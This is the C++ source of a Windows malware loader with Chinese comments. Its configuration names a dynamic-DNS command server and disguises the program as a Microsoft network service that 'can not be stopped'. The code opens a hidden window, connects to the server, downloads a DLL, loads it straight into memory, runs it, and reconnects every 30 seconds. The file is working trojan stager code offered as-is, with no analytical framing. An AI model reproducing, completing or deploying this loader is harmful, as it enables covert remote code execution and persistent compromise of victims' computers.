
#include "stdafx.h"
#include "windows.h"
#include <winsock2.h>
#pragma comment (lib, "Ws2_32.lib")

//#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")
//#pragma comment(linker,"/ENTRY:WinMain")

//#include "MemLoadDll.h"
#include "MemoryModule.h"

struct MODIFY_DATA
{
	char  strIPFile[128];   //ip文件or DNS						0
	char  strVersion[16];   //服务端版本							128
	DWORD dwVipID;          //VIP ID							144
	BOOL  bReplace;         //TRUE-替换服务，FALSE-新建服务		148
	char  strSvrName[32];   //服务名称							149
	char  strSvrDisp[100];  //服务显示							181
	char  strSvrDesc[100];  //服务描述							281
	char  ServerAddr[100];	//Client Addr						381
	int   ServerPort;		//Client port						481
} modify_data =
{
	"lkyfire.vicp.net:80",
	"20170507",
	405,
	FALSE,
	"WinNetCenter",
	"Microsoft(R) Multi Protocol Network Control Center",
	"Provides supports for multi network Protocol. This service can not be stopped.",
	"127.0.0.1", //lkyfire.vicp.net
	80
};

unsigned long _stdcall resolve(char *host)
{
	long i = inet_addr(host);

	if (i == INADDR_NONE) //Not Ip
	{
		struct hostent *ser = (struct hostent*)gethostbyname(host);

		if (ser == NULL)
		{
			ser = (struct hostent*)gethostbyname(host); //retry
		}

		if (ser != NULL)
		{
			return (*(unsigned long *)ser->h_addr);
		}

		return 0;
	}

	return i;
}

SOCKET ConnectServer()
{
	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_port = htons(modify_data.ServerPort);
	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);

	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		return SOCKET_ERROR; //connect error
	}

	TurnonKeepAlive(MainSocket, 60);

	return MainSocket;
}

DWORD GetDllData(SOCKET MainSocket, LPVOID& buf)
{
	MsgHead msgHead;
	msgHead.dwCmd = SOCKET_DLLLOADER;
	msgHead.dwSize = 0;

	if (!SendMsg(MainSocket, NULL, &msgHead))
	{
		MsgErr("Loader Request Can't Send");

		return 0;
	}

	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
	{
		MsgErr("Can't Recv Dll Data Head");

		return 0;
	}

	if (msgHead.dwCmd != CMD_DLLDATA)
	{
		MsgErr("Received dll head incorrect");

		return 0;
	}

	buf = VirtualAlloc(msgHead.dwSize);

	if (!RecvData(MainSocket, (char *)buf, msgHead.dwSize))
	{
		MsgErr("Can't Recv Dll Data");
		VirtualFree(buf, msgHead.dwSize);

		return 0;
	}

	return msgHead.dwSize;
}

DWORD LoadDll(DWORD dllSize, LPVOID buf)
{
	HMEMORYMODULE hModule = MemoryLoadLibrary(buf, dllSize);
	VirtualFree(buf, dllSize);

	if (hModule == NULL)
	{
		return (DWORD)WORKING_STATE::LOAD_ERR;
	}

	typedef DWORD(*_RoutineMain)(LPVOID lp);

	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
	DWORD iRet = RoutineMain((LPVOID)&modify_data);
	MemoryFreeLibrary(hModule);

	return iRet;
}

DWORD _stdcall WorkThread(LPVOID lParam)
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

	SOCKET MainSocket = ConnectServer();

	if (MainSocket == SOCKET_ERROR)
	{
		MsgErr("Can't Connect to Dll Server");

		return (DWORD)WORKING_STATE::CONNECT_ERR;
	}

	LPVOID buf = NULL;

	DWORD dllSize = GetDllData(MainSocket, buf);

	shutdown(MainSocket, 0x02);
	closesocket(MainSocket);

	if (dllSize == 0)
	{
		MsgErr(_T("Receive Err"));

		return (DWORD)WORKING_STATE::RECEIVE_ERR;
	}

	return LoadDll(dllSize, buf);
}

int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
		L"#32770",
		L"WindowsNet",
		WS_OVERLAPPEDWINDOW,
		0,
		0,
		100,
		100,
		HWND_DESKTOP,
		NULL,
		GetModuleHandleW(0),
		NULL
	);

	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

	GetInputState();
	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);

	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);

	DWORD state = (DWORD)WORKING_STATE::CONNECT_ERR;

	while (true)
	{
		__try
		{
			state = WorkThread(NULL);
		}
		__except (1)
		{
			MsgErr("ConnectThread Exception");
		}

#ifdef NDEBUG
		Sleep(30000);
#endif

		if (state == (DWORD)WORKING_STATE::ON_EXIT)
		{
			Dbp("Exit Request to loader");
			break;
		}
	}

	WSACleanup();

	return 0;
}
